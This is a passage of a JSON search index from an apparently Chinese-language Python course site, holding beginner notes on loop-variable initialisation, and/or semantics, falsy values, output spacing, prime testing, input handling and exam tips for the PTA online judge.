flag=1\u662f\u4e00\u4e2a\u521d\u59cb\u5316\u8bed\u53e5\uff0c\u653e\u5728\u5faa\u73af\u91cc\u9762\u5c31\u4f1a\u5bfc\u81f4\u6bcf\u6b21\u5faa\u73af\u90fd\u8fdb\u884c\u521d\u59cb\u5316\uff0c\u5c31\u53d8\u6210\u4e86\u53ea\u8981\u6700\u540e\u4e00\u4e2a\u8eab\u4efd\u8bc1\u6ca1\u9519\u6700\u540eflag\u5c31\u662f1\uff0c\u4f60\u4f1a\u9519\u8bef\u7684\u8f93\u51faAll Passed! \u53d8\u91cf\u7684\u521d\u59cb\u5316\u9700\u8981\u5728\u8fdb\u5165\u5faa\u73af\u4e4b\u524d\u505a\u5b8c \u5b66\u4f1a\u62c6\u5206\u95ee\u9898 \u5927\u800c\u5316\u5c0f \u00b6 \u9898\u76ee\u8981\u6c42\u5b9e\u73b0aa+aaaa+\u2026+aaa\u2026\u2026a(n\u4e2aa)\u6c42\u548c \u62c6\u5206\u6210\u4e24\u4e2a\u95ee\u9898\uff1a\u600e\u4e48\u5f97\u5230n\u4e2aa\uff1f \u600e\u4e48\u5faa\u73af\u4ece2\u5230n\u6c42\u548c\uff1f \u4e0d\u8981\u628a\u8fd9\u4e24\u4e2a\u95ee\u9898\u6df7\u5728\u4e00\u8d77\u601d\u8003\uff0c\u5982\u679c\u4f60\u4e0d\u77e5\u9053\u53ef\u4ee5\u7528\u5b57\u7b26\u4e32\u4e58\u4ee5\u6574\u6570\uff0c\u90a3\u4f60\u53ef\u4ee5\u5148\u5047\u8bbe\u6709\u8fd9\u4e48\u4e00\u4e2a\u51fd\u6570getna(n, a)\uff0c\u7d2f\u52a0\u5c31\u662f\uff1a a = '5' n = 4 #\u5b9e\u9645\u4e0a\u9700\u8981input()\uff0c\u6211\u4eec\u8fd9\u91cc\u5c31\u76f4\u63a5\u5199\u4e86 \u9700\u8981\u8ba1\u7b9755+5555 s = 0 for i in range ( 2 , n + 1 , 2 ): s += getna ( a , i ) \u7136\u540e\u6211\u4eec\u518d\u53bb\u5b9e\u73b0getna\u8fd9\u4e2a\u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u5c31\u5e72\u4e00\u4ef6\u4e8b\u60c5\u2014\u2014\u8f93\u5165a\u548cn\uff0c\u8f93\u51faaaa\u2026a(n\u4e2aa)\u8fd9\u4e48\u4e00\u4e2a\u6574\u6570 \u8f93\u5165a=\u20185\u2019,n=4\uff0c\u8f93\u51fa5555 \u8fd9\u6b21\u6211\u7528\u5faa\u73af\u4e58\u6cd5\uff0c\u53ef\u4ee5\u770b\u6210 5 + 5*10 + 5*10*10 + 5*10*10*10 \u6bcf\u6b21\u5faa\u73af\u90fd\u662f5\u4e58\u4ee5\u4e00\u4e2a\u6570\uff0c\u8fd9\u4e2a\u6570\u4ece1\u5f00\u59cb \u6bcf\u6b21\u5faa\u73af\u540e\u4e58\u4ee510 def getna ( a , n ): # \u8fd9\u91cc\u6211\u4eec\u9700\u8981a\u4e5f\u662f\u4e00\u4e2a\u6574\u6570 a , n = int ( a ), int ( n ) #\u9632\u5fa1\u6027\u7f16\u7a0b\uff0c\u4f60\u4e0d\u77e5\u9053\u8c03\u7528\u8005\u662f\u5426\u7ed9\u4e86\u9700\u8981\u7684\u7c7b\u578b\uff0c\u53cd\u6b63\u8f6c\u6362\u4e00\u4e0b\u4e0d\u8d39\u4e8b multiply = 1 res = 0 for i in range ( n ): res += a * multiply multiply *= 10 return res \u6d4b\u8bd5\u4e00\u4e0b\u81ea\u5df1\u5bf9\u4e0d\u5bf9\uff1a >>> getna ( \"5\" , 4 ) 5555 \u6700\u540e\u628a\u4e24\u90e8\u5206\u62fc\u8d77\u6765\u5c31\u884c\u54af def getna ( a , n ): # \u8fd9\u91cc\u6211\u4eec\u9700\u8981a\u4e5f\u662f\u4e00\u4e2a\u6574\u6570 a , n = int ( a ), int ( n ) #\u9632\u5fa1\u6027\u7f16\u7a0b\uff0c\u4f60\u4e0d\u77e5\u9053\u8c03\u7528\u8005\u662f\u5426\u7ed9\u4e86\u9700\u8981\u7684\u7c7b\u578b\uff0c\u53cd\u6b63\u8f6c\u6362\u4e00\u4e0b\u4e0d\u8d39\u4e8b multiply = 1 res = 0 for i in range ( n ): res += a * multiply multiply *= 10 return res a = '5' n = 4 s = 0 for i in range ( 2 , n + 1 , 2 ): s += getna ( a , i ) print ( s ) \u5f53\u7136\u8fd9\u4e2a\u9898\u76ee\u6709\u7b80\u5316\u505a\u6cd5\uff1a n\u4e2aa\u8fd9\u4e2a\u6574\u6570\u7528 \u5b57\u7b26\u4e32\u4e58\u4ee5\u6570\u5b57\u5f97\u5230\u5b57\u7b26\u4e32 \u518dint\u8f6c\u6574\u6570 int(str(a)*int(n)) \u4ece2\u5230n\u6bcf\u6b21\u9012\u589e2\uff0c\u7528range(2,n+1,2) \u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u5217\u8868\u6c42\u548c\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u7528sum\u51fd\u6570\uff0crange\u8fd4\u56de\u7684\u4e1c\u897f\u53ef\u4ee5\u770b\u6210\u4e00\u4e2a\u5217\u8868\uff0c \u5217\u8868\u8f6c\u6362\u6210\u53e6\u4e00\u4e2a\u5217\u8868\u7528\u5217\u8868\u63a8\u5bfc\u5f0f\u5c31\u884c \u5199\u6cd5\uff1a[something(i) for i in \u2026] a = '5' n = 4 print ( sum ([ int ( str ( a ) * int ( i )) for i in range ( 2 , n + 1 , 2 ) ]) ) \u6df7\u5728\u4e00\u8d77\u7684and\u548cor \u00b6 and\u7684\u4f18\u5148\u7ea7\u6bd4or\u9ad8 x = 5 y = False z = False print ( x or y and z ) \u8fd9\u4e2a\u7b49\u4ef7\u4e8eprint(x or (y and z)) \u5148\u8ba1\u7b97False and False\u662fFalse\uff0c\u7136\u540ex or False\u56e0\u4e3ax\u662f\u771f\u7684 \u7ed3\u679c\u5c31\u662fx \u8f93\u51fa5 a and b \u00b6 \u8fd4\u56de\u7684\u53ea\u53ef\u80fd\u662fa\u548cb\u4e4b\u95f4\u7684\u4e00\u4e2a\uff0ca\u662f\u771f\u7684\u5c31\u8fd4\u56deb\uff0ca\u662f\u5047\u7684\u5c31\u8fd4\u56dea >>> 1 and 6 6 >>> [] and 6 [] a or b \u00b6 \u8fd4\u56de\u7684\u53ea\u53ef\u80fd\u662fa\u548cb\u4e4b\u95f4\u7684\u4e00\u4e2a\uff0ca\u662f\u771f\u7684\u5c31\u8fd4\u56dea\uff0ca\u662f\u5047\u7684\u5c31\u8fd4\u56deb >>> 1 or 6 1 >>> [].sort() or 6 6 \u8fd8\u8bb0\u5f97\u4e0a\u9762\u8bf4\u7684.sort()\u8fd4\u56deNone\u5417\uff1f None\u662f\u5047\u7684\u5662 \u54ea\u4e9b\u4e1c\u897f\u662f\u5047\u7684\uff1f \u00b6 0\u662f\u5047\u7684\uff0c\u7a7a\u7684\u4e1c\u897f '', [], {} \u662f\u5047\u7684\uff0cFalse\u662f\u5047\u7684\uff0cNone\u662f\u5047\u7684\uff0c\u5176\u4ed6\u7684\u90fd\u662f\u771f\u7684 \u641c\u7d22python False values\u53ef\u4ee5\u641c\u5230 https://docs.python.org/3/library/stdtypes.html Any object can be tested for truth value, for use in an if or while condition or as operand of the Boolean operations below. By default, an object is considered true unless its class defines either a bool () method that returns False or a len () method that returns zero, when called with the object. 1 Here are most of the built-in objects considered false: constants defined to be false: None and False. zero of any numeric type: 0, 0.0, 0j, Decimal(0), Fraction(0, 1) empty sequences and collections: \u2018\u2019, (), [], {}, set(), range(0) Operations and built-in functions that have a Boolean result always return 0 or False for false and 1 or True for true, unless otherwise stated. (Important exception: the Boolean operations or and and always return one of their operands.) \u884c\u672b\u5230\u5e95\u8981\u4e0d\u8981\u8f93\u51fa\u7a7a\u683c \u00b6 \u65b9\u6cd5\u662f \u590d\u5236\u4e00\u4e0b\u9898\u76ee\u7684\u8f93\u51fa\u6837\u4f8b \uff0c\u770b\u770b\u5230\u5e95\u6700\u540e\u6709\u6ca1\u6709\u7a7a\u683c \u600e\u6837\u505a\u5230\u672b\u5c3e\u4e0d\u8f93\u51fa\u7a7a\u683c \u00b6 \u5982\u679c\u53ef\u4ee5\u8f93\u51fa\u7a7a\u683c\uff0c\u7b80\u5355 \u5faa\u73af\u91cc\u9762print(item, end=\u2019 \u2018)\u5c31\u884c \u4e3e\u4e2a\u4f8b\u5b50\u5427\uff0c\u9898\u76ee\u8981\u6c42\u6211\u4eec\u8f93\u51fa1 2 3 \uff0c\u672b\u5c3e\u8981\u6709\u7a7a\u683c \u7528print\u8bb0\u5f97end\u53c2\u6570\u8981\u5199\u4e0a\uff0c\u5426\u5219\u5c31\u6362\u884c\u4e86 for i in range ( 1 , 4 ): print ( i , end = ' ' ) \u65b9\u68481\uff1a\u628a\u8981\u8f93\u51fa\u7684\u4e1c\u897f\u6682\u65f6\u5b58\u5230\u6570\u7ec4result\u91cc\uff0c\u6700\u540e print(*result) \u00b6 \u9898\u76ee\u8981\u6c42\u6211\u4eec\u8f93\u51fa1 2 3\uff0c\u672b\u5c3e\u4e0d\u80fd\u6709\u7a7a\u683c result = [] for i in range ( 1 , 4 ): result . append ( i ) print ( * result ) \u8fd9\u91cc\u7528\u5230\u4e86\u7b26\u53f7 * \uff0c\u5728\u8c03\u7528\u51fd\u6570\u7684\u65f6\u5019\u4f7f\u7528\u661f\u53f7\u8868\u793a\u628a\u8fd9\u4e2a\u6570\u7ec4\u62c6\u5f00\uff0c\u6570\u7ec4\u7684\u6bcf\u4e2a\u5143\u7d20\u90fd\u4f5c\u4e3a\u51fd\u6570\u7684\u53c2\u6570 \u5047\u8bbe result=[1,2,3] \uff0c print([1,2,3]) \u4f1a\u8f93\u51fa [1, 2, 3] \u4e24\u8fb9\u6709\u65b9\u6846 \u4e0d\u662f\u6211\u4eec\u8981\u7684 \u8bd5\u8bd5 print(*[1,2,3]) \u4f1a\u8f93\u51fa 1 2 3 \u5b83\u5c31\u7b49\u4ef7\u4e8e print(1,2,3) \u770b\uff0c\u5217\u8868\u7684\u6bcf\u4e2a\u5143\u7d20\u4ece\u6570\u7ec4\u7684\u675f\u7f1a\u4e2d\u89e3\u8131\u51fa\u6765\uff0c\u76f4\u63a5\u5f53\u6210print\u7684\u53c2\u6570\u4e86\uff01 \u65b9\u68482\uff1a\u533a\u5206\u9996\u5143\u7d20\u548c\u5176\u540e\u7684\u5143\u7d20 \u00b6 \u6bd4\u5982\u8981\u8f93\u51fa 1 2 3 \uff0c\u6211\u4eec\u8fd9\u4e48\u770b\u5f85\uff1a 1/\u7a7a\u683c2/\u7a7a\u683c3 \u4e3a\u5565\u8fd9\u6837\u770b\u5462\uff1f\u4e3a\u5565\u4e0d\u770b\u6210\u662f 1\u7a7a\u683c/2\u7a7a\u683c/3 \u5462\uff1f\u56e0\u4e3a\u5faa\u73af\u5565\u65f6\u5019\u7ed3\u675f\u5f88\u53ef\u80fd\u662f\u4f60\u4e0d\u77e5\u9053\u7684\uff0c\u4f60\u5c31\u65e0\u6cd5\u5224\u65ad\u5f53\u524d\u5143\u7d20\u662f\u4e0d\u662f\u6700\u540e\u4e00\u4e2a\u3002 \u4f46\u662f\u4f60\u4e00\u5b9a\u77e5\u9053\u54ea\u4e2a\u5143\u7d20\u662f\u7b2c\u4e00\u4e2a\u5143\u7d20\u554a\uff01 isfirst = True for i in range ( 1 , 4 ): if isfirst : # \u7b2c\u4e00\u4e2a\u5143\u7d20 print ( i , end = '' ) isfirst = False else : # \u540e\u7eed\u7684\u5143\u7d20 \u5148\u8f93\u51fa\u4e00\u4e2a\u7a7a\u683c print ( '' , i , end = '' ) #\u7b49\u4ef7\u4e8eprint(' '+str(i), end='') \u5982\u4f55\u6b63\u786e\u5730\u6362\u884c print(\u2018\\n\u2019)\u662f\u4e0d\u884c\u7684 \u00b6 \u4e0a\u9762\u6211\u4eec\u90fd\u662f\u5728\u4e00\u884c\u91cc\u8f93\u51fa\uff0c\u73b0\u5728\u6211\u4eec\u8981\u5f00\u59cb\u4e0b\u4e00\u884c\u4e86\uff0c\u4f60\u5f88\u53ef\u80fd\u60f3 print('\\n') \u8fd9\u4e2a\u5b9e\u9645\u4e0a\u662f print('\\n', end='\\n') \u56e0\u4e3a\u4f60\u6ca1\u6709\u63d0\u4f9bend\u53c2\u6570\uff0cend\u5c31\u9ed8\u8ba4\u662f\u4e00\u4e2a\u6362\u884c\uff0c\u4f60\u81ea\u5df1\u53c8\u663e\u793a\u4e86\u4e2a\u6362\u884c\uff0c\u90a3\u5c31\u662f\u4e24\u4e2a\\n\u4e86\uff01 \u4e24\u4e2a\\n\uff01\u5148\u8fdb\u5165\u4e0b\u4e00\u884c\uff0c\u518d\u8fdb\u5165\u4e0b\u4e00\u884c\uff0c\u4e0d\u5c31\u663e\u793a\u4e86\u4e00\u4e2a\u591a\u4f59\u7684\u7a7a\u884c\u4e86\u561b\uff01 \u89e3\u51b3\u65b9\u6848\uff1a print() \u591a\u7b80\u5355 \u5faa\u73af\u521d\u59cb\u5316 \u653e\u5728\u6b63\u786e\u7684\u4f4d\u7f6e \u00b6 \u5faa\u73af\u4f9d\u8d56\u7684\u53d8\u91cf\u7684\u521d\u59cb\u5316\u2014\u2014\u4e00\u5b9a\u8981\u5728\u5faa\u73af\u5f00\u59cb\u4e4b\u524d\u505a\uff01\u4e0d\u80fd\u5728\u5916\u9762\u5faa\u73af\u4e4b\u524d\u505a\uff01 t = int ( input ()) cnt = 0 lst = [] #\u50a8\u5b58\u7ed3\u679c \uff0c \u6700\u540e\u4e00\u8d77\u8f93\u51fa for i in range ( t ) : n = int ( input ()) mat = [] for j in range ( n ) : mat . append ( input (). split ()) for row in range ( 1 , n ) : for col in range ( 0 , n - 1 ) : if row > col and mat [ row ][ col ]== '0' : cnt += 1 if cnt == ( n ** 2 - n ) / 2 : str = \"YES\" else : str = \"NO\" lst . append ( str ) for z in lst : print ( z ) \u4f8b\u5982\u8fd9\u4e2a\u5224\u65ad\u4e0a\u4e09\u89d2\u7684\uff0c\u5148\u770b\u8fd9\u4ee3\u7801\u7684\u672c\u8d28\u2014\u2014\u5faa\u73af\u91cc\u9762\u6709\u5faa\u73af\uff0c\u5916\u5c42\u5faa\u73af\uff08range t\uff09\u662f\u591a\u4e2a\u77e9\u9635\uff0c\u5185\u5c42\u5faa\u73af\uff08row\u548ccol\uff09\u7528\u6765\u904d\u5386\u77e9\u9635 \u90a3\u95ee\u9898\u6765\u4e86\uff0c\u5185\u5c42\u5faa\u73af\u7684cnt\u4f5c\u7528\u5728\u5355\u4e2a\u77e9\u9635\u91cc\u9762\uff0c\u4e0d\u540c\u77e9\u9635\u4e4b\u95f4\u4e0d\u80fd\u76f8\u4e92\u5e72\u6270\uff0c\u4e5f\u5c31\u662f\u8bf4cnt\u5e94\u8be5\u5728\u8fdb\u5165row\u5faa\u73af\u4e4b\u524d\u521d\u59cb\u5316\uff01\u628acnt=0\u79fb\u52a8\u5230\u7b2c9\u884c\u4e4b\u524d\u5373\u53ef \u518d\u6253\u4e2a\u6bd4\u65b9\uff0c\u6211\u4eec\u8981\u8ba1\u7b97\u591a\u4e2a\u73ed\u7ea7\u5206\u522b\u7684\u5e73\u5747\u5206\uff0c\u9700\u8981\u5bf9\u73ed\u7ea7\u5185\u7684\u6bcf\u4e2a\u5b66\u751f\u7d2f\u52a0\u5230sum_score\uff0c\u90a3\u4f60\u5c31\u9700\u8981\u5728 \u8fdb\u5165\u8fd9\u4e2a\u73ed\u7ea7\u7684\u5faa\u73af\u540e \u5bf9\u73ed\u7ea7\u5185\u6bcf\u4e2a\u5b66\u751f\u904d\u5386\u7684\u5faa\u73af\u524d \u5bf9sum_score \u8fdb\u884c\u521d\u59cb\u5316 sum_score=0\uff1b\u5982\u679c\u4f60\u63d0\u65e9\u505a\u4e86\uff0c\u4e0a\u4e2a\u73ed\u7ea7\u7684\u603b\u5206\u5c31\u4f1a\u52a0\u5165\u5230\u4e0b\u4e2a\u73ed\u7ea7\uff0c\u4e0d\u5408\u9002\u5427 n=int(input()) data=[int(input()) for i in range(n)] a=2 for i in data: while a<i: if i%a==0: print('No') break a=a+1 else: print('Yes') \u8fd9\u662f\u53e6\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5224\u65ad\u7d20\u6570\uff0c\u6bcf\u4e2a\u7d20\u6570\u7684\u5224\u65ad\u5e94\u8be5\u662f\u72ec\u7acb\u7684\uff0c\u9700\u8981\u628aa=2\u79fb\u52a8\u5230 for i in data: \u5faa\u73af\u5f00\u59cb\u4e4b\u540e while a<i \u5faa\u73af\u5f00\u59cb\u4e4b\u524d \u7b80\u800c\u8a00\u4e4b\uff1a\u54ea\u4e2a\u5faa\u73af\u8d1f\u8d23\u8fd9\u4e2a\u53d8\u91cf\uff0c\u5c31\u5728\u8fd9\u4e2a\u5faa\u73af\u4e4b\u524d\u505a\u521d\u59cb\u5316\uff0c\u4fdd\u8bc1\u5916\u5c42\u5faa\u73af\u4e92\u4e0d\u5e72\u6270 \u586b\u7a7a\u9898\u522b\u51fa\u73b0\u4e2d\u6587\u5f15\u53f7 \u00b6 \u522b\u4ee5\u4e3a\u522b\u7684\u9898\u76ee\u6587\u672c\u91cc\u51fa\u73b0\u4e86\u4e2d\u6587\u5f15\u53f7\u4f60\u5c31\u80fd\u7528\uff0c\u9898\u76ee\u4e0d\u4e25\u8c28\u4e0d\u4ee3\u8868\u4f60\u80fd\u4e0d\u4e25\u8c28 \u600e\u4e48\u6b63\u786e\u5730\u5224\u65ad\u7d20\u6570 \u00b6 \u5982\u679c\u4f60\u8fd8\u4e0d\u4f1a\uff0c\u5efa\u8bae\u80cc\u4e0b\u6765\u6807\u51c6\u7b54\u6848\uff1a\u53ea\u8981\u9047\u5230\u9700\u8981\u5224\u65ad\u7d20\u6570\u7684\u9898\u76ee\uff0c\u5148\u9ed8\u5199\u8fd9\u4e2aisPrime\u51fd\u6570 \u8bb0\u5fc6\u53e3\u8bc0\uff1a1\u4e0d\u662f\uff0c2\u662f\uff0c\u4ece2\u5230(\u6839\u53f7n) + 1 import math def isPrime ( n ): if n == 1 : return False if n == 2 : return True for i in range ( 2 , int ( math . sqrt ( n ) + 1 )): if n % i == 0 : return False return True \u4e0d\u8981\u628a\u7d20\u6570\u5224\u65ad\u7684\u4ee3\u7801\u548c\u5176\u4ed6\u4ee3\u7801\u6df7\u5728\u4e00\u8d77\uff0c\u6c42\u6c42\u4f60\u5199\u4e2a\u51fd\u6570\u5427\uff01 \u5199\u4e86\u51fd\u6570\u4e4b\u540e\u4f60\u53ef\u4ee5\u81ea\u5df1\u8c03\u7528\u51fd\u6570\u53bb\u6d4b\u8bd5\u554a\uff0c\u5982\u56fe\u6240\u793a\uff0c\u6211\u5199\u4e86\u4e4b\u540e\u5c31\u4f1a\u81ea\u5df1\u6784\u9020\u4e00\u4e9b\u6570\u636e\u53bb\u6d4b\u8bd5\u3002 \u6d4b\u8bd5 \u6d4b\u8bd5 \u6d4b\u8bd5 >>> import math >>> def isPrime ( n ): ... if n == 1 : ... return False ... if n == 2 : ... return True ... for i in range ( 2 , int ( math . sqrt ( n ) + 1 )): ... if n % i == 0 : ... return False ... return True ... >>> isPrime ( 1 ) False >>> isPrime ( 2 ) True >>> isPrime ( 3 ) True >>> isPrime ( 4 ) False >>> isPrime ( 5 ) True >>> isPrime ( 6 ) False >>> isPrime ( 101 ) True >>> isPrime ( 100 ) False \u8fd0\u884c\u8d85\u65f6\u600e\u4e48\u7834\uff1f \u00b6 \u8bb0\u4f4f\u5224\u65ad\u7d20\u6570\u53ef\u4ee5\u5f00\u6839\u53f7\u554a\uff01 \u00b6 \u4e0d\u8981\u4ece2\u5230n-1\uff0c\u6839\u53f7n\u5c31\u884c\u4e86 \u9898\u76ee\u7ed9\u7684\u4e0a\u754c\u4e00\u5b9a\u4f1a\u6709\u6d4b\u8bd5\u70b9 \u00b6 \u9a8c\u8bc1\u54e5\u5fb7\u5df4\u8d6b\u731c\u60f3\u4e00\u9898 \u9898\u76ee\u8bf4 \u8f93\u5165\u5728\u4e00\u884c\u4e2d\u7ed9\u51fa\u4e00\u4e2a(2, 2 000 000 000]\u8303\u56f4\u5185\u7684\u5076\u6570N\u3002 \u54c7 \u597d\u591a0\uff0c\u6570\u4e00\u6570\u8fd9\u662f20\u4ebf\u554a\uff0c\u653e\u4e00\u4e2a\u8fd9\u4e48\u5927\u7684\u4e0a\u754c\u5728\u8fd9\u91cc\u5e72\u5565\u554a\uff1f\u53ea\u662f\u597d\u770b\u561b\uff1f \u80af\u5b9a\u662f\u6709\u4e00\u4e2a\u6d4b\u8bd5\u70b9\u4f1a\u8f93\u5165\u8fd9\u4e2a20\u4ebf\uff0c\u4f60\u81ea\u5df1\u672c\u5730\u6d4b\u8bd5\u4f60\u7684\u4ee3\u7801\u5c31\u4e00\u5b9a\u8981\u8bd5\u8bd5 \u7136\u540e\u5c31\u53d1\u73b0\u4f60\u7684\u7a0b\u5e8f\u597d\u4e45\u6ca1\u53cd\u5e94\uff0c\u5c31\u5e94\u8be5\u4f18\u5316\u4e86 \u60f3\u60f3\u600e\u4e48\u7b80\u5316\u8ba1\u7b97 \u00b6 \u8fd8\u662f\u54e5\u5fb7\u5df4\u8d6b\u731c\u60f3\u8fd9\u4e2a\u9898\u76ee\uff0c\u4f60\u89c9\u5f97\u9700\u8981\u6c42\u51fa\u5c0f\u4e8eN\u7684\u6240\u6709\u7d20\u6570\u561b\uff1f\u7136\u540e\u5728\u8fd9\u4e2a\u7d20\u6570\u6570\u7ec4\u91cc\u6c42\u6c42\u548c\uff1f \u5f53\u7136\u8fd9\u4e2a\u65b9\u6cd5\u6ca1\u9519\uff0c\u53ea\u662f\u592a\u6162\u4e86\uff0c\u8981\u6c42\u51fa20\u4ebf\u4ee5\u5185\u7684\u6240\u6709\u7d20\u6570\uff0c\u8fd9\u4e2a\u592a\u8d35\u4e86\uff08\u592a\u8017\u65f6\u4e86\uff0c\u65f6\u95f4\u5c31\u662f\u91d1\u94b1\u554a\uff09 \u6211\u4eec\u7684\u76ee\u6807\u53ea\u662f\u7ed9\u51fa\u4e00\u4e2aN=p+q\u5c31\u884c\uff0c\u53ea\u8981\u4ece2\u5f00\u59cb\u627e\u7d20\u6570p\uff0c\u7136\u540e\u9a8c\u8bc1N-p\u4e5f\u662f\u7d20\u6570\u5373\u53ef Python Homework Review \u00b6 PDF\u4e0b\u8f7d \u63d0\u7eb2\uff1a Python\u548cC\u8bed\u8a00\u4e0d\u540c\u7684\u5730\u65b9 \u7a0b\u5e8f\u8f93\u51fa\u5565\uff1f\u628a\u81ea\u5df1\u5f53\u6210Python\u89e3\u91ca\u5668 \u5199\u8349\u7a3f \u5c40\u90e8\u53d8\u91cf \u51fd\u6570\u91cc\u88ab\u8d4b\u503c\u4e86\u7684\u5c31\u662f\u5c40\u90e8\u53d8\u91cf \u5bf9\u9f50 {0:T^20} \u7528T\u8865\u9f5020\u4f4d \u5c45\u4e2d \u7f16\u7a0b\u9898\u8003\u8bd5\u6280\u5de7\uff1a \u4e00\u6b65\u6b65\u5199\uff0c\u5199\u4e00\u70b9\u5c31\u4fa7\u4e00\u70b9 \u5185\u7f6e\u51fd\u6570\u719f\u7ec3\u638c\u63e1 \u5982sum \u6ce8\u610f\u7a7a\u683c \u4e0d\u8981\u6d6a\u8d39\u65f6\u95f4\u5728\u683c\u5f0f\u9519\u8bef\u4e0a \u4ed4\u7ec6\u8bfb\u9898 \u4e00\u904d\u4e0d\u884c\u591a\u8bfb\u51e0\u904d \u770b\u770b\u4e0a\u754c\uff08\u4e00\u822c\u7528\u4e0d\u7740\uff09 \u63d0\u53d6\u51fa\u51fd\u6570\uff0c\u964d\u4f4e\u601d\u7ef4\u8d1f\u62c5 \u9012\u5f52\u51fd\u6570\u600e\u4e48\u5199\uff1f\u60f3\u6e05\u695a \u53c2\u6570 \u8fd4\u56de\u503c \u7684\u542b\u4e49 \u5b9e\u5728\u641e\u4e0d\u5b9a\uff1f\u522b\u653e\u5f03\uff0c\u9a97\u5206\uff01 \u9700\u8981\u8bb0\u4f4f\u70b9\u5565\uff1f \u7c7b\u578b\uff1ainput()\u8fd4\u56de\u7684\u662f\u5b57\u7b26\u4e32\uff0c\u7528int, float\u8f6c\u6362\uff1b\u7528isinstance\u5224\u65ad\u7c7b\u578b\uff1b\u54ea\u4e9b\u662fFalse \u6570\u5b57\uff1a\u9664\u4ee50\u7684\u5f02\u5e38\uff0c\u8fdb\u5236\u8f6c\u6362\uff0c\u5224\u65ad\u7d20\u6570\uff0c\u683c\u5f0f\u5316\u8f93\u51fa\uff0c\u4f18\u5148\u7ea7 \u5b57\u7b26\u4e32\uff1alen\uff0cupper\uff0clower\uff0cstrip\uff0csplit\uff0cjoin \u5217\u8868\uff1aappend\uff0cindex\uff0csorted(key=lambda i:-i)\uff0c\u6570\u7ec4\u7684\u6570\u7ec4\uff0c\u5206\u7247\uff0c [::-1] \uff0c\u5217\u8868\u63a8\u5bfc\u5f0f \u5b57\u5178\uff1akeys\uff0citems\uff0cupdate \u5faa\u73af\uff1arange\uff0cfor i in \u2026\uff0cwhile \u2026\uff0c\u53d8\u91cf\u521d\u59cb\u5316 \u51fd\u6570\uff1a\u4f20\u9012\u4e00\u4e2a\u5217\u8868\uff1f\uff08\u5f15\u7528\u4f20\u9012\uff09\u5c40\u90e8\u53d8\u91cf\uff0c\u5168\u5c40\u53d8\u91cf tuple\uff1bset\uff1b\u6587\u4ef6\uff1b\u7c7b","title":"Course Python\u7a0b\u5e8f\u8bbe\u8ba1"},{"location":"PythonCourse/#python","text":"","title":"Python\u7a0b\u5e8f\u8bbe\u8ba1\u8bfe\u7a0b"},{"location":"PythonCourse/#_1","text":"PTA\u6ca1\u6709\u63d0\u4f9b\u8be6\u7ec6\u7684\u62a5\u9519\uff0c\u4f60\u90fd\u4e0d\u77e5\u9053\u9519\u54ea\u4e86\u600e\u4e48\u6539\uff0c\u5efa\u8bae\u4f60\u8bd5\u8bd5\u672c\u6587\u63d0\u5230\u7684\u9519\u8bef\uff0c\u8bb0\u4f4f\u9519\u8bef\u4fe1\u606f\u4e0b\u6b21\u9047\u5230\u4e5f\u5c31\u4e0d\u614c\u4e86 \u672c\u5730Python\u8dd1\u6210\u529f\u518d\u63d0\u4ea4\u63d0\u9ad8\u6548\u7387\uff0c\u7701\u70b9\u65f6\u95f4","title":"\u5148\u672c\u5730\u6d4b\u8bd5\u80fd\u901a\u8fc7\u518d\u63d0\u4ea4"},{"location":"PythonCourse/#_2","text":"a=int\uff08input\uff08\uff09\uff09 b=int\uff08input\uff08\uff09\uff09 print(a+b) \u62a5\u9519\uff1a File \"<stdin>\", line 1 a=int\uff08input\uff08\uff09\uff09 ^ SyntaxError: invalid character in identifier \u770b\u51fa ( \u4e0e \uff08 \u7684\u533a\u522b\u4e86\u561b\uff0cPython\u8bed\u8a00\u7684\u62ec\u53f7\u8981\u6c42\u534a\u89d2\u7684\u62ec\u53f7 \u89e3\u51b3\u65b9\u6848\uff1a \u5173\u6389\u4e2d\u6587\u8f93\u5165\u6cd5\uff01","title":"\u5168\u89d2\u7684\u7b26\u53f7"},{"location":"PythonCourse/#input","text":"\u770b\u6e05\u695a\u9898\u76ee\uff0c\u5982\u679c\u9898\u76ee\u6709\u4e24\u884c\u8f93\u5165\uff0c\u5c31\u9700\u8981\u4e24\u6b21input() \u5982\u679c\u9898\u76ee\u53ea\u6709\u4e00\u884c\u8f93\u5165\uff0c\u6bd4\u5982\u4e00\u884c\u540c\u65f6\u7ed9\u4e86\u4e24\u4e2a\u6570\u7a7a\u683c\u5206\u9694\uff0c\u4f60\u9700\u8981 input().split()","title":"input\u53ea\u8bfb\u53d6\u8f93\u5165\u7684\u4e00\u884c"},{"location":"PythonCourse/#map","text":"\u7528\u6cd5\u662f map(\u76ee\u6807\u51fd\u6570\uff0c\u5217\u8868) \u8fd4\u56de \u5217\u8868\u6bcf\u4e2a\u5143\u7d20\u8c03\u7528\u76ee\u6807\u51fd\u6570\u7684\u7ed3\u679c\u7684 \u8fed\u4ee3\u5668 iterator \uff0c\u518d\u7528list\u53ef\u4ee5\u5f97\u5230\u5217\u8868 \u4e3e\u4e2a\u4f8b\u5b50\u9898\u76ee\u8981\u5728\u4e00\u884c\u4e2d\u8f93\u5165\u591a\u4e2a\u6574\u6570 # map\u5b9e\u9645\u4e0a\u8fd4\u56de\u7684\u662f\u8fed\u4ee3\u5668 \uff0c\u88ab\u8bfb\u5230\u7684\u65f6\u5019\u624d\u4f1a\u771f\u6b63\u8c03\u7528\u76ee\u6807\u51fd\u6570\uff0c\u60f3\u5f97\u5230\u5217\u8868\u8fd8\u9700\u8981\u7528 list >>> map ( int , input (). split ()) 222 444 < map object at 0 x000001D87FB4DAC8 > >>> list ( map ( int , input (). split ())) 222 444 [ 222 , 444 ] >>> a , b = map ( int , input (). split ()) 333 555 >>> a 333 >>> b 555","title":"\u6269\u5c55\u4e00\u4e0b\uff1a\u4f60\u53ef\u4ee5\u4f7f\u7528map\u51fd\u6570\u6765\u6279\u91cf\u8c03\u7528\u51fd\u6570"},{"location":"PythonCourse/#_3","text":"A=int(input('\u88ab\u52a0\u6570')) B=int(input('\u52a0\u6570')) print(A+B) PTA\u5224\u9898\u5c31\u662f\u5224\u65ad\u4f60\u7a0b\u5e8f\u7684\u8f93\u51fa\u662f\u5426 \u548c\u6807\u51c6\u7b54\u6848\u5b8c\u5168\u4e00\u81f4 \u5b8c\u5168\u4e00\u81f4 \u5b8c\u5168\u4e00\u81f4 \u9898\u76ee\u6ca1\u6709\u8981\u6c42\u4f60\u8f93\u51fa 